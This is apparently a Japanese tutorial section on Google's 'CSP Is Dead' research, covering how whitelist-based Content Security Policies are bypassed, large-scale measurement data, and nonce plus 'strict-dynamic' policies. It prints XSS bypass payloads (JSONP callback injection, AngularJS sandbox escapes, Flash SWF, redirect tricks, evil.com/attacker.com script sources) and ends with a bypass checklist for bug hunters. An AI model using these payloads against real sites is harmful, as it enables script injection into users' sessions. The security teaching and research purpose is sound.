## CSPの限界（CSP Is Dead 論文）

XSS対策として広く推奨されてきた **CSP（Content Security Policy／コンテンツセキュリティポリシー）** は、「ブラウザに許可リストを宣言し、リストにないスクリプトの実行を拒否させる」多層防御(defense-in-depth)の仕組みです。ところが2016年、Googleのセキュリティチーム（Lukas Weichselbaum、Michele Spagnuolo、Sebastian Lekies、Artur Janc）がACM CCS 2016で発表した論文 **"CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"** は、実際にインターネット上で配信されているCSPポリシーのうち **94.72% が自明に回避可能(trivially bypassable)** であることを、Google検索インデックスを使った大規模実測によって示しました。

本節では、この論文と、同じ著者の一人LukasがDeepSec 2016で行った講演スライド「CSP Is Dead, Long Live Strict CSP!」を主資料として、(1) CSPの脅威モデルの正確な理解、(2) ホワイトリスト方式が構造的に破綻する仕組み、(3) その代替として提案された `'strict-dynamic'` を伴うnonceベースCSP（strict CSP）の設計原理、を順に解説します。読者はこの節を読むことで「CSPがあるからXSSは無害化されている」という前提がなぜ多くの場合に成り立たないのかを、仕組みのレベルで説明できるようになります。

### 前提：CSPは何を守り、何を守らないのか

CSPは `Content-Security-Policy` HTTPレスポンスヘッダ（違反を記録するだけの `Content-Security-Policy-Report-Only` ヘッダ、または `<meta>` 要素）で配信されます。論文はCSPの機能を3つに分類しています。

1. **リソース読み込み制限**: `script-src` / `style-src` / `img-src` / 包括的な `default-src` などのディレクティブで、サブリソースの取得元を「ソースリスト（source list、通称ホワイトリスト）」に限定する。
2. **URLベースの補助的制限**: `frame-ancestors`（クリックジャッキング対策）、`base-uri` と `form-action`（`<base href>` や `<form action>` を悪用するpost-XSS攻撃の緩和）。
3. **その他の封じ込め・堅牢化オプション**: `block-all-mixed-content`、`upgrade-insecure-requests`、`plugin-types`、`sandbox`。

論文のTable 1に挙げられたディレクティブ一覧は `default-src` / `script-src` / `style-src` / `img-src` / `media-src` / `font-src` / `frame-src` / `object-src` / `child-src` / `worker-src` / `manifest-src` です。

重要なのは **脅威モデル** です。論文によればCSPが防げるのはXSS・クリックジャッキング・混在コンテンツ(mixed content)の3種類だけで、しかも「クリックジャッキングは `X-Frame-Options` でほぼ防げており、能動的な混在コンテンツは最近のブラウザが既定でブロックしている」ため、**CSPの実質的な価値はXSS緩和にほぼ集約される**、と結論づけています。そしてXSSを防ぐのは `script-src` と `object-src`（両者が無ければ `default-src`）だけです。

さらに決定的な非対称性があります。

> スクリプトを実行できる攻撃者は、他のすべてのディレクティブの制限を回避できる。

つまり `img-src` や `frame-ancestors` をどれだけ厳しくしても、`script-src` が破られた瞬間にすべて無意味になります。逆に言えば、CSPの評価は「script実行を止められているか」の一点で決まります。

#### script-srcにおける4つの許可方式

ソースリストにはホスト名（`example.org`）、サブドメインを含めるワイルドカード（`*.example.org`）、スキーム（`https:`、`data:`）、そして特殊キーワード `'self'`（現在のドキュメントのオリジン）と `'none'`（空のリスト）を書けます。CSP2以降はパス（`example.org/resources/js/`）も指定できます。加えて `script-src` には以下の4つの制御があります。

1. `'unsafe-inline'` — インライン `<script>` ブロックとイベントハンドラ属性を許可する（**XSS対策としてのCSPを事実上無効化する**）。
2. `'unsafe-eval'` — `eval()`、`setTimeout()`、`setInterval()`、`Function` コンストラクタなど、文字列をコードとして実行するAPIを許可する。
3. **nonce** — `script-src 'nonce-random-value'` と書き、ページ内の `<script nonce="random-value">` だけを実行許可する一回限りのトークン。
4. **hash** — `script-src 'sha256-nGA...'` のように、期待するインラインスクリプトの暗号学的ハッシュを列挙する。

論文が例示する「ロックダウンされたポリシー」（Listing 2）は次の形です。

```
Content-Security-Policy: script-src 'nonce-BPNLMA4' 'sha256-OPc+f+ieuYDM...' object-src 'none';
```

#### 安全なポリシーが満たすべき3条件

論文は「スクリプト実行を防ぐ」ために必要な条件を3つ挙げ、それぞれに対応するバイパス例（Listing 3〜5）を示しています。

**条件1: `script-src` と `object-src` の両方（または `default-src`）を定義していること。**

```html
<script src="//evil.com"></script>

<object data="//evil.com/evil.swf">
  <param name="allowscriptaccess" value="always">
</object>
```

> なぜ動くか: `script-src` だけを書いて `object-src` も `default-src` も書かないと、プラグイン系リソースは無制限になります。Adobe Flashのようなプラグインは埋め込み元ページのコンテキストでJavaScriptを実行できる（`allowscriptaccess=always`）ため、`<object>` 経由で任意スクリプト実行に到達します。DeepSecスライドはこの具体例として、Googleのホストに置かれた実在のYUIチャート用SWFを使うペイロードを示しています。
>
> ```html
> ">'><object type="application/x-shockwave-flash"
> data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//'>
> <param name="AllowScriptAccess" value="always"></object>
> ```
>
> `allowedDomain` パラメータの値がSWF内部で生成されるJavaScriptコードに埋め込まれるため、`\"})))}catch(e){...}//` という文字列でその構文を脱出し、任意のJSを実行できます。

**条件2: `script-src` に（nonceを伴わない）`'unsafe-inline'` や `data:` URIを含めないこと。**

```html
<img src="x" onerror="evil()">

<script src="data:text/javascript,evil()"></script>
```

> なぜ動くか: `'unsafe-inline'` はインラインイベントハンドラ（`onerror=`）を許可するため、注入されたマークアップだけでコードが動きます。`data:` を許可すると、スクリプト本体をURL内に直接埋め込めるので、外部ホストを一切必要とせずに任意コードを読み込めます。DeepSecスライドの `script-src 'self' https: data: *;` はこの両方に該当し、`<script src=https://attacker.com/evil.js>` も `<script src=data:text/javascript,alert(1337)>` も通ります。

**条件3: `script-src` / `object-src` のソースリストに、レスポンスの「セキュリティ上重要な部分」を攻撃者が制御できるエンドポイントや、危険なライブラリを含めないこと。**

```html
<script src="/api/jsonp?callback=evil"></script>

<script src="angular.js"></script> <div ng-app>
{{ executeEvilCodeInUnsafeSandbox() }} </div>
```

この条件3こそが、論文の核心である「ホワイトリストは維持不可能」という主張につながります。

> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/

### ホワイトリストが壊れる4つの仕組み

論文の2.3節は、CSPの暗黙の前提である「ホワイトリストに載せたドメインは安全なコンテンツしか配信しない」が、現実のWebアプリケーションの一般的な実装パターンによって破られることを示します。

#### (1) ユーザ制御のコールバックを持つJavaScript（JSONP）

JSONPは、APIのJSONデータをコールバック関数でラップして返し、`<script>` として読み込ませる古典的なクロスオリジン通信手法です。論文Listing 6:

```html
<script src="/path/jsonp?callback=alert(document.domain)//"></script>
```

サーバが返すレスポンス:

```js
/* API response */
alert(document.domain);//{"var": "data", ...});
```

> なぜ動くか: `callback` パラメータの値がレスポンス先頭にそのまま展開され、それがJavaScriptとしてパースされます。攻撃者はコールバック名の位置に `alert(document.domain);//` のような「関数呼び出し＋行コメント」を差し込むことで、後続のJSON部分を無効化しつつ任意のコードを実行できます。CSPから見れば、このスクリプトは**ホワイトリストに載っている正規ドメインから読み込まれている**ので、何も違反していません。

制御できる文字が制限され関数名しか指定できない場合でも、**SOME（Same Origin Method Execution）** 攻撃により、ページ内の既存の任意関数（`x.click` など）を呼び出せるため、実務上は完全なXSSと同等に危険であると論文は述べています。実測では **JSONPバイパスの39%が任意のJS実行を許し、残りはSOME攻撃が可能** でした。

DeepSecスライドの図解は挙動を端的に示します。

```
">'><script src="https://whitelisted.com/jsonp?callback= alert(1);u">
  → レスポンス: alert(1);u({...})            ← 完全なJS実行

">'><script src="https://whitelisted.com/jsonp?callback= x.click">
  → レスポンス: x.click({...})               ← SOME攻撃
```

スライドの教訓は「**JSONPエンドポイントをホワイトリストに載せてはいけない。しかし世の中には大量に存在する — 特にCDNに**」です。

#### (2) リフレクション／シンボリック実行によるJSガジェット

ホワイトリストされたオリジンにある「協力的なスクリプト」が、意図せずCSPを回避させてしまうケースです。論文Listing 7:

```js
// Can be used to invoke window.* functions with
// arbitrary arguments via markup such as:
// <input id="cmd" value="alert,safe string">
var array =
  document.getElementById('cmd').value.split(',');
window[array[0]].apply(this, array.slice(1));
```

> なぜ動くか: このコード自体は「開発者が用意したDOM要素の値で関数を呼ぶ」だけで、単体では脆弱性ではありません。問題は、マークアップ注入のバグがあるアプリでこのスクリプトが読み込まれると、攻撃者が `id="cmd"` を持つ要素を注入することで `window[...]` に任意の関数名と引数を渡せる点です。スクリプト本体は正規のホワイトリストされたドメインから来ているため、CSPは一切ブロックしません。

最も影響が大きい実例が **AngularJS** です。論文Listing 8:

```html
<script src="whitelisted.com/angular.js"></script>
<div ng-app>{{ 1000 - 1 }}</div>
```

AngularJSはページ内の指定領域をテンプレートとしてパースし評価します。既定では `eval()` を使うため `'unsafe-eval'` のないCSPでは止まりますが、AngularJSには **「CSP互換モード」(`ng-csp`)** が用意されており、このモードでは式をシンボリック実行（インタプリタ的に評価）するため、**`'unsafe-eval'` なしでも任意のJavaScript相当の処理が可能**になります。DeepSecスライドの具体ペイロード:

```html
"><script src="https://whitelisted.com/angular.min.js"></script>
<div ng-app ng-csp>{{1336 + 1}}</div>

"><script src="https://whitelisted.com/angularjs/1.1.3/angular.min.js"></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```

> なぜ動くか: 1つ目は式評価が生きていることの確認（`1337` が表示される）。2つ目はAngularJS 1.1.3という**サンドボックスバイパスが知られた旧バージョン**を狙い、`$event.view` からグローバルの `window` を取り出して `alert` を呼びます。`ng-click` はユーザ操作が必要ですが、スライドは「JSONPエンドポイントや他のJSライブラリと組み合わせればユーザ操作なしでも動く」と注記しています。
>
> さらに強力な組み合わせとして、古いPrototype.jsを併用する例が示されています。
>
> ```html
> <script src="//whitelisted.com/angular.js"></script>
> <script src="//whitelisted.com/prototype.js"></script>
> <div ng-app ng-csp>{{$on.curry.call().alert(1)}}</div>
> ```
>
> Prototype.jsが `Function.prototype.curry` を定義しているため、AngularJSのサンドボックス内から `curry.call()` を経由して `this` がグローバルオブジェクト（`window`）になったコンテキストを獲得でき、`alert` に到達します。

決定的なのは、**攻撃対象のアプリがAngularJSを一切使っていなくても、ホワイトリストされたドメインのどこかにAngularJSが置いてあるだけでCSPが無効化される**という点です。論文の表現では「trusted domainにAngularライブラリが存在するだけで、CSPが提供する保護は覆される」。

#### (3) 意図せずJavaScriptとしてパースできてしまうレスポンス

ブラウザは互換性のため、レスポンスのMIMEタイプと利用コンテキストの一致を厳密に検査しません。したがって **「構文エラーなくJavaScriptとしてパースでき、かつ攻撃者制御のデータが最初の実行時エラーより前に現れる」レスポンスはすべてスクリプトになりえます**。論文が挙げる類型:

```
Name,Value
alert(1),234
```

```
Error: alert(1)// not found.
```

- 攻撃者が一部を制御できるCSV（カンマ区切り）データ
- リクエストパラメータをそのまま含むエラーメッセージ
- **ユーザのファイルアップロード**（たとえHTMLエスケープ／サニタイズ済みでも）

> なぜ動くか: `alert(1),234` はJavaScriptとしては「`alert(1)` を評価し、カンマ演算子で `234` を評価する」有効な式文です。`Name,Value` の行で `Name` と `Value` は未定義変数参照となり得ますが、パース自体は通り、実行時エラーが起きる前に `alert(1)` が到達すれば攻撃は成立します。

DeepSecスライドは、この帰結として `script-src 'self'` と**同一オリジンでのユーザコンテンツ配信**の組み合わせが危険であることを強調します。

```html
">'><script src="/user_upload/evil_cat.jpg.js"></script>
```

同様に、`object-src` のホワイトリスト先にFlashとして解釈されるファイルをアップロードできれば、そこからスクリプト実行が可能です。

論文はここで重要な指摘をしています。**これらのパターンはそれ自体では直接のセキュリティリスクではないため、開発者に修正の動機がない**。CSPを導入して初めて問題になるのですが、影響を受けるのは自分のオリジンだけでなく、`script-src` に書いたすべてのサードパーティやCDN — つまり**自分が修正を依頼できない相手**にまで及びます。

#### (4) パス制限はセキュリティ機構として機能しない

CSP2はドメイン単位の粒度の粗さを補うためパス指定（`example.org/foo/bar`）を導入しました。しかし、クロスオリジンリダイレクトに関するプライバシー上の懸念（Homakovの "Using Content-Security-Policy for Evil" で議論された、パス情報のクロスオリジン漏洩）への対処として、**リダイレクトの結果として読み込まれたリソースについては、ソース式のパス部分を無視する**という緩和が仕様に入りました。論文Listing 9:

```
Content-Security-Policy: script-src example.org
    partially-trusted.org/foo/bar.js
```

```html
// Allows loading of untrusted resources via:
<script src="//example.org?
    redirect=partially-trusted.org/evil/script.js">
```

DeepSecスライドのより実戦的な例:

```
script-src https://whitelisted.com/totally/secure.js https://site.with.redirect.com;
object-src 'none';
```

```html
">'><script src="https://site.with.redirect.com/redirect?url=https%3A//whitelisted.com/jsonp%2Fcallback%3Dalert">
```

> なぜ動くか: ブラウザはまず `site.with.redirect.com`（ホワイトリスト済み）へリクエストします。そこから `whitelisted.com/jsonp?callback=alert` へ30xリダイレクトされると、リダイレクト後のマッチング処理では**パス成分が無視される**ため、「`/totally/secure.js` だけ許可」という意図は無効化され、同じホストの任意のパス（ここではJSONPエンドポイント）が読み込めてしまいます。仕様の原文は「パス情報のクロスオリジン漏洩を避けるため、リダイレクトの結果ロードされたリソースについてはソース式のパス成分をマッチングアルゴリズムが無視する」と述べています。

OAuthやリファラ漏洩防止など、複雑なアプリにはリダイレクタが普遍的に存在します。したがって論文は「**パス制限はCSPのセキュリティ機構として依拠できない**」と結論します。

> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf

### 大規模実測：数字が語る「CSPは死んでいる」

#### データセットと方法論

- 使用したのはGoogle検索インデックス（約6.5ペタバイト、直近約20日以内にクロールされたレスポンスヘッダとボディ）。
- インデックスには約**1060億のユニークURL**、**10億のホスト名**、1億7500万のtop private domainが含まれる。
- そのうち **3,913,578,446 URL（3.7%）** がCSPを持っていた。ただしURL単位では巨大サイトが過大評価されるため、ホスト単位で見ると **1,664,019ホスト（全ホスト名の0.16%）／274,214 top private domain** がCSPを配信していた（論文アブストラクトでは1,680,867ホストと記載）。
- 100万ホストが5つのEコマースアプリのいずれかにマップされ（例：Alibabaのミニショップは60万超のホストに同一CSPを配信）、ごく少数のポリシーが大量に重複していた。そこで**正規化**（余分な空白除去、nonce/report-uriなど可変値のプレースホルダ化、ディレクティブと値の順序統一・重複排除）した上で重複排除し、最終的に **26,011個のユニークなポリシー** を得た。
- 同時にバイパス材料も収集: **880万のJSONPエンドポイント**（`callback` / `cb` / `json` / `jsonp` というGETパラメータを持つURLを抽出し、値を変えてリクエストしてレスポンス先頭に反映されるか実検証）と、**260万のAngularJSライブラリ**（ソースコードのシグネチャでマッチし、バージョン文字列も抽出）。ドメイン単位では **194,908ドメインがJSONPエンドポイントを持ち、101,330ドメインがAngularJSをホスト**していました。

判定は自動化された4つのチェック — (1) nonceなしの `'unsafe-inline'`、(2) `object-src` も `default-src` も無い、(3) ホワイトリストに汎用ワイルドカードやURIスキーム（`http:` / `https:` / `data:`）が入っている、(4) ホワイトリストにバイパス可能エンドポイントを持つホストが入っている — で行われました。

#### 用途の実態

ディレクティブの出現頻度（Figure 1）は `script-src` 22,573 / `default-src` 22,294 / `style-src` 20,346 / `img-src` 20,179 …と続き、`frame-ancestors` はわずか2,111（**全体の8.1%**）でした。また26,011ポリシーのうち report-only は **9.96%** にとどまり、**90.04%が強制(enforcing)モード**。これは「CSPは主にXSS対策として使われている」ことの明確な証拠だと論文は述べます。

#### 中核の数字（論文Table 2）

| データセット | 総数 | Report Only | unsafe-inline | object-src欠落 | ワイルドカード | 危険なドメイン | **自明にバイパス可能** |
|---|---|---|---|---|---|---|---|
| ユニークCSP | 26,011 | 2,591 (9.96%) | 21,947 (84.38%) | 3,131 (12.04%) | 5,753 (22.12%) | 19,719 (75.81%) | **24,637 (94.72%)** |
| XSS保護ポリシー | 22,425 | 0 (0%) | 19,652 (87.63%) | 2,109 (9.4%) | 4,816 (21.48%) | 17,754 (79.17%) | **21,232 (94.68%)** |
| 厳格なXSS保護ポリシー | 2,437 | 0 (0%) | 0 (0%) | 348 (14.28%) | 0 (0%) | 1,015 (41.65%) | **1,244 (51.05%)** |

ここで「XSS保護ポリシー」とは**強制モードで、かつ `script-src` または `default-src` を含むもの**、「厳格なXSS保護ポリシー」とはさらに `'unsafe-inline'`・URIスキーム・汎用 `*` ワイルドカードといった本質的に危険な値を一切含まないものです。

読み取るべきポイントは3つです。

- 全体の94.72%、XSS保護目的に限っても94.68%がバイパス可能。
- 論文は「**CSPを配信しているホストの99.34%が、XSSに対して何の利益も無いポリシーを使っている**」とも述べています。
- そして最も重要なのは最終行です。**「危険なキーワードを一切使わず、真面目に作られた」2,437個の厳格なポリシーですら、51.05%が自動ツールだけでバイパスできた**。その大半の原因は `script-src` ホワイトリスト内の危険なオリジンでした。しかもこれは「完全自動で見つかった分」なので**下限値**であり、実際の不安全率はさらに高いと論文は注記しています。

#### ホワイトリストは長くなるほど壊れる

ポリシーあたりのホワイトリストエントリ数は**中央値12**、最長のものは **512ホスト**。そして「**中央値の12エントリの時点で、全ポリシーの94.8%がバイパス可能**」でした（Figure 3）。短いホワイトリストはまだ安全ですが、長くなるほど急速に破綻します。

どのドメインが危険なのか。論文Table 5は、`script-src` に最も多く書かれた15ホストのバイパス可否を示します。

| 件数 | 割合 | ホスト | JSONP | AngularJS | バイパス可否 |
|---|---|---|---|---|---|
| 8,825 | 33.93% | www.google-analytics.com | unsafe-evalがあれば可 | 不可 | unsafe-evalがあれば可 |
| 7,201 | 27.68% | *.googleapis.com | 可 | 可 | **可** |
| 6,307 | 24.25% | *.google-analytics.com | unsafe-evalがあれば可 | 不可 | unsafe-evalがあれば可 |
| 5,817 | 22.36% | *.google.com | 可 | 不可 | **可** |
| 5,475 | 21.05% | *.yandex.ru | 可 | 不可 | **可** |
| 5,146 | 19.78% | *.gstatic.com | 不可 | 可 | **可** |
| 5,076 | 19.51% | vk.com | 可 | 不可 | **可** |
| 4,728 | 18.18% | mc.yandex.ru | 可 | 不可 | **可** |
| 4,423 | 17.00% | yandex.st | 不可 | 可 | **可** |
| 4,189 | 16.10% | ajax.googleapis.com | 可 | 可 | **可** |
| 3,829 | 14.72% | *.googlesyndication.com | 可 | 不可 | **可** |
| 3,621 | 13.92% | *.doubleclick.net | 可 | 不可 | **可** |
| 3,617 | 13.91% | yastatic.net | 不可 | 可 | **可** |
| 2,959 | 11.38% | connect.facebook.net | 不可 | 不可 | 不可 |
| 2,809 | 10.80% | www.google.com | 可 | 不可 | **可** |

すなわち **15ドメイン中12が完全なCSPバイパスを導入し、2つは `'unsafe-eval'` と組み合わさるとバイパス可能、バイパスが自動発見できなかったのは1つだけ**（`connect.facebook.net`）。そして **上位10ドメインだけで全ユニークCSPの68%をバイパスできる**（Figure 4）。さらに衝撃的な補足として、**仮にこれら上位10ドメインからJSONPとAngularJSを完全に除去したとしても、残るホストで依然として66%のポリシーがバイパス可能**でした。

バイパス手段の内訳（Table 4）は、XSS保護ポリシー22,425件のうち JSONP起因が17,381件、AngularJS起因が12,617件、`object-src` 起因（脆弱なFlashファイル）が2,915件です。

#### script-srcで実際に使われている値（Table 3）

| 値 | 使用率 |
|---|---|
| `'self'` | 90.95% |
| `'unsafe-inline'` | 87.26% |
| `'unsafe-eval'` | 81.65% |
| **nonce** | **0.92%** |
| `https:` | 3.64% |
| `http:` | 0.85% |
| `data:` | 4.04% |
| 汎用ワイルドカード `*` | 1.18% |
| ワイルドカード付きホスト | 69.59% |
| パス付きホスト | 6.92% |
| SHA-256ハッシュ | 1.65% |
| SHA-384ハッシュ | 0.04% |
| SHA-512ハッシュ | 0.01% |

**nonceの使用率がわずか0.92%** という数字が、2016年当時の実態を象徴しています。

> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/

### 解決策：nonceベースCSPと `'strict-dynamic'`

#### なぜnonceなのか

論文の提案はシンプルです。**ドメインを信頼するのをやめ、スクリプト1つ1つを信頼する**。

危険なホワイトリストベースのポリシー:

```
Content-Security-Policy: script-src example.org
```
```html
<script src="//example.org/script.js?callback=foo"></script>
```

これは `https://example.org/script?callback=malicious_code` を注入されれば終わりです。これを次のように書き換えます。

```
Content-Security-Policy:
    script-src 'nonce-random123'
    default-src 'none'
```
```html
<script nonce="random123"
  src="https://example.org/script.js?callback=foo">
</script>
```

> なぜ安全になるか: nonceはリクエストごとに生成される推測不能な値で、CSPヘッダとHTML属性の両方に現れます。マークアップ注入ができる攻撃者は、**その時のnonce値を知らない**ため、同じJSONPエンドポイントを指す `<script>` を注入しても実行されません。ホワイトリストというドメイン単位の粗い信頼が、スクリプトタグ単位の精密な信頼に置き換わります。

論文はここで運用上の注意点も述べています。**nonceベースポリシーにホワイトリストを足すとnonceの利点が失われます**（リソースはホワイトリストかnonceのどちらかを満たせば通るため）。セキュリティチームが「許可されたホスト」を中央集権的に強制したい場合は、**ブラウザが複数ポリシーをすべて満たすことを要求する性質**を利用して、カンマ区切りで2つのポリシーを配信します。

```
Content-Security-Policy:
    <!-- whitelist - based CSP -->
    script-src https://example.org
    default-src    https://foobar.org,
    <!-- nonce - based CSP -->
    script-src 'nonce-random123'
```

#### nonceの弱点と `'strict-dynamic'` の発明

nonceだけでは実務で壊れます。JavaScriptライブラリが**動的にスクリプトを追加する**パターン（極めて一般的）で、ライブラリはnonce値を知らないからです。

```html
<script nonce="r4nd0m">
  var s = document.createElement("script");
  s.src = "//example.com/bar.js";
  document.body.appendChild(s);
</script>
```

このとき `bar.js` はnonceを持たないためブロックされます。ライブラリを改造して2段目以降のスクリプトにnonceを伝播させるのは現実的ではありません。

そこで論文が提案し、CSP3ドラフトに入ったのが **`'strict-dynamic'`** です。`script-src` にnonce（またはhash）と共に書かれると、次の2つの効果が生じます。

- **動的に追加されたスクリプトの実行を許可する**。具体的には `document.createElement('script')` で作られたスクリプトノードは、その読み込み元URLがホワイトリストにあるかどうかに関係なく許可される。
- **他の `script-src` ホワイトリストエントリを無視する**。静的な（パーサが挿入した）スクリプトは、正しいnonceを伴わない限り実行されない。

```
Content-Security-Policy:
  script-src 'nonce-random123' 'strict-dynamic';
  object-src 'none';
```

> なぜ安全なままなのか: この設計の核心にある観察は「**`createElement()` で追加されるスクリプトは、すでにアプリケーションが信頼しているものである**」という点です。開発者が明示的にロードを選んだコードだからです。一方、マークアップ注入のバグを見つけた攻撃者は、**まずJavaScriptを実行できなければ `createElement()` を呼べません**。そしてJavaScriptを実行するには正しいnonceが必要です。つまり信頼は「nonceを持つ起点スクリプト」から「その子孫スクリプト」へ**推移的にのみ**伝播し、注入されたマークアップからは伝播しません。

DeepSecスライドは伝播の境界を明確に示しています。`'strict-dynamic'` が信頼を伝播させるのは **non-parser-inserted（パーサ非挿入）** なスクリプトだけです。したがって以下はいずれも**動きません**。

```html
<script nonce="r4nd0m">
  var s = "<script ";
  s += "src=//example.com/bar.js></script>";
  document.write(s);
</script>
```
```html
<script nonce="r4nd0m">
  var s = "<script ";
  s += "src=//example.com/bar.js></script>";
  document.body.innerHTML = s;
</script>
```

> なぜ動かないか: `document.write()` や `innerHTML` 経由で挿入されたスクリプトは、HTMLパーサによって生成されるため「parser-inserted」扱いになります（そもそも `innerHTML` 経由の `<script>` はHTML仕様上実行されません）。信頼の伝播はDOM APIで明示的に作られたスクリプトノードに限定されており、これが「文字列からHTMLを組み立てる」という**XSSと区別がつかないパターン**を巻き込まないための線引きです。

#### 古いブラウザへのフォールバックを含む実戦的なポリシー

DeepSecスライドが推奨する「そのままコピーして使える」形はこれです。

```
script-src 'nonce-r4nd0m' 'strict-dynamic' 'unsafe-inline' https:;
object-src 'none';
```

各トークンの役割と、ブラウザ世代ごとの解釈:

| トークン | 意味 |
|---|---|
| `'nonce-r4nd0m'` | 正しいnonceを持つスクリプトを実行許可 |
| `'strict-dynamic'` | **[新]** 信頼を伝播し、ホワイトリストを破棄する |
| `'unsafe-inline'` | CSP2以降ではnonceの存在により無視される。**CSP1しか解さない古いブラウザで `script-src` を無害化(no-op)するため**に置く |
| `https:` | HTTPSスクリプトを許可。`'strict-dynamic'` をサポートするブラウザでは破棄される |

- **CSP3対応ブラウザ**: `'strict-dynamic'` が効き、`'unsafe-inline'` と `https:` は破棄される → 最も強い保護。
- **CSP2対応ブラウザ**（nonceは理解するが `'strict-dynamic'` は知らない）: nonceの存在により `'unsafe-inline'` が破棄され、`https:` によるホワイトリストベースの保護が働く。
- **CSP1しか対応しないブラウザ**: nonceを理解しないため `'unsafe-inline'` が有効になり、ポリシーは実質no-op（=既存サイトを壊さない）。

この「**段階的に劣化するが決してサイトを壊さない**」設計が、strict CSPの採用しやすさを支えています。

#### 限界（論文4.3節 + スライド）

`'strict-dynamic'` は万能薬ではありません。

**セキュリティ上の限界:**

```html
<script nonce="r4nd0m">
  var s = document.createElement("script");
  s.src = userInput + "/x.js";
</script>
```

> なぜ問題か: XSSの根本原因が「動的に作られたスクリプトの `src` 属性に信頼できないデータが流れ込む」ことである場合、ホワイトリストベースのCSPなら読み込み先がポリシーで制限されていたのに対し、`'strict-dynamic'` では制限が外れるため**むしろ悪用可能になります**。

他の限界として、(a) nonceを付けた `<script>` の**内部**に注入点がある場合は無条件に実行されてしまう（ただしこれは従来のポリシーでも同じ）、(b) スクリプト実行を防げても post-XSS / scriptless attacks のような限定的だが有害な攻撃は残りうる、が挙げられています。

**互換性上の限界:**

- `document.write()` で動的にスクリプトを追加しているコードは `'strict-dynamic'` でブロックされるため、`createElement()` に書き換えるか、`document.write` で生成する `<script>` に明示的にnonceを渡す必要がある。
- `'strict-dynamic'` は、`javascript:` URIやインラインイベントハンドラといった**CSP非互換マークアップを除去する作業を不要にはしない**。

ただし、スライドが強調するように「**新たに生まれる攻撃面（動的スクリプトロードDOM API）は、レビューとコントロールが格段に容易**」です。ホワイトリスト上の全ドメインの全エンドポイントを監査するのと、自分のコード内の `createElement('script').src` を数えるのとでは、難易度が桁違いです。

#### 実運用の実績（ケーススタディ）

論文は Google Maps Activities（月間アクティブユーザ400万の複雑なJavaScript重量級アプリ）での経験を報告しています。

- 2015年2月にホワイトリストベースの強制CSPを導入。単純なポリシーから始めたが、アプリ・API・ライブラリの変化に追従するため **2015年を通じて5回の大きな変更** を余儀なくされた。
- 本番での破損を避けるためオリジンを定期更新した結果、`script-src` ホワイトリストは **15個の長いパス** にまで膨れ上がり、しかも**最低1つのJSONPエンドポイントを含まざるを得なかった** — つまりXSS対策としては無効だった。
- 一方、マークアップへのnonce付与はすでに済んでいたため、**ホワイトリストベースから `'strict-dynamic'` を使うnonceのみのポリシーへの移行はリファクタリング不要**だった。移行後はポリシーが劇的に単純化され、破損も減り、**それ以降ポリシーを変更する必要が一度も無かった**。
- 同様のポリシーが Google Photos、Cloud Console、History、Cultural Institute などにも展開された。DeepSecスライドの時点で **月間アクティブユーザ合計3億以上** のGoogleサービスに展開済みで、Google Maps API、Google Charts API、Facebookウィジェット、Twitterウィジェット、reCAPTCHAなどが**追加作業なしで動作する**と報告されています。

論文は、Google社内のXSSバグ数百件の根本原因分析に基づき、「**大多数のXSSはnonceベースポリシーで緩和できる**」と結論しています。

#### 診断ツール：CSP Evaluator

著者らは、実際のポリシーをこれらの基準で自動評価するツール **CSP Evaluator**（https://csp-evaluator.withgoogle.com ）を公開しています。コアライブラリはオープンソースで、Chrome拡張としても提供されています。自分のサイトのCSPが「94.72%側」に入っていないかを確認する最初の一歩として有用です。

> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf

### まとめ：バグハンター視点での読み替え

この論文の結論は、防御側にとっては「ホワイトリストを捨ててnonce + `'strict-dynamic'` へ移行せよ」というメッセージですが、攻撃側・診断側の視点で読み替えると、XSSを見つけた後に「CSPがあるから報告価値が下がる」と諦める前に確認すべきチェックリストになります。

1. **`object-src` / `default-src` はあるか。** 無ければ `<object>` + 既知の脆弱なSWFでスクリプト実行に到達しうる（2016年時点の手法。現在はFlashが廃止されているため、この経路は歴史的知識として理解する）。
2. **`'unsafe-inline'` がnonce無しで入っていないか。** 入っていればCSPは実質存在しない。
3. **`data:` やスキーム、汎用ワイルドカードは無いか。**
4. **ホワイトリストの各ホストにJSONPエンドポイントは無いか。** `callback` / `cb` / `json` / `jsonp` パラメータを試す。
5. **ホワイトリストの各ホストにAngularJS（特にサンドボックスバイパスが既知の旧版）や、`Function.prototype` を拡張する旧Prototype.jsは置かれていないか。**
6. **ホワイトリストにオープンリダイレクタは無いか。** あればパス制限は無効化できる。
7. **`'self'` が許可されていて、かつ同一オリジンに任意ファイルをアップロードできないか。**
8. **`'strict-dynamic'` がある場合は**、ホワイトリスト由来のバイパスは全て無効になるので、代わりに「動的スクリプト生成の `src` に自分の入力が届くか」「nonce付きスクリプトの内部に注入できるか」「nonceが予測可能／漏洩していないか」を探す。

そして最後に、論文自身が強調している原則を忘れないでください。**CSPは多層防御であり、入力検証と出力エンコーディングの代替ではありません。** CSPがあるかどうかにかかわらず、XSSの根本原因を潰すことが第一の防御です。

> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/
> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf
